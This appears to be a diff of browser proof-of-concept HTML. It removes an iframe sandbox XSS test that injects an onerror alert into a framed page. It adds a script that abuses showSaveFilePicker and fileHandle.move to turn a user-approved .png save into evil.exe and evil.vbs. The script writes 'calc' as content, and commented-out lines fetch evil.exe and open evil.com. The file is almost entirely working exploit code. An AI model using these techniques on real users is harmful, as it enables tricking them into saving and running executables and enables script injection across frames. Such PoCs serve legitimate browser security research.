@@ -1,15 +1,34 @@
-<html>
-    <head>
-    </head>
-    <body>
-        <iframe title="test" id="frame01" sandbox="allow-same-origin" src="https://programmablesearchengine.google.com/about/"></iframe>
-        <script>
-            let frame = document.getElementById("frame01");
-            frame.addEventListener("load", function() {
-                let newDiv = document.createElement("div");
-                newDiv.innerHTML = "<img src='x' onerror='parent.window.alert(document.domain)'>";
-                frame.contentWindow.document.body.appendChild(newDiv);
-            });
-        </script>
-    </body>
-</html>
+<button onclick="saveFile()">Save File</button>
+<script>
+async function saveFile() {
+    try {
+        // 1. Call showSaveFilePicker()
+        const fileHandle = await window.showSaveFilePicker({
+            suggestedName: `hello`,
+            startIn: "desktop",
+            // Filename prompt visible to the user
+            types: [{
+                description: [`ImageFile`],
+                accept: {
+                    'image/png': ['.png']
+                },
+            }, ],
+        });
+        // 2. Get the FileSystemWritableFileStream
+        const writableStream = await fileHandle.createWritable();
+        // 3.1 Write malicious file data to download, saved as exe
+        // const evilFile = await fetch(`evil.exe`)
+        // await evilFile.body.pipeTo(writableStream)
+        fileHandle.move("evil.exe")
+        // 3.2 Or write custom content and close the stream, e.g., .bat
+      
+        await writableStream.write(new TextEncoder().encode(`calc`));
+        await writableStream.close();
+        fileHandle.move("evil.")
+        fileHandle.move("evil.vbs")
+          //window.open("https://evil.com");
+    } catch (error) {
+        console.log(error)
+    }
+}
+</script>
